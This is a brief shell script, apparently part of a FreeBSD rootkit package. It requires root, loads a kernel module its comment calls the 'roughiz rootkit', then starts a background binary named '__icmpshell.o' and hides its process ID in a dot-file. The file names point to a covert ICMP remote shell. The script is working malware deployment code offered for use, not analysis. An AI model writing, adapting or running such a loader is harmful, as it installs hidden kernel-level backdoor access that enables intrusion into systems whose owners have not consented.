#!/bin/sh

# Script to load the roughiz rootkit
if [ "$(id -u)" != "0" ];
then
        echo "This script must be run as root" 1>&2
	exit -1
fi

echo "loading roughiz"
kldload module/roughiz.ko && ./__icmpshell.o & echo $! > .__icmpshell.pid



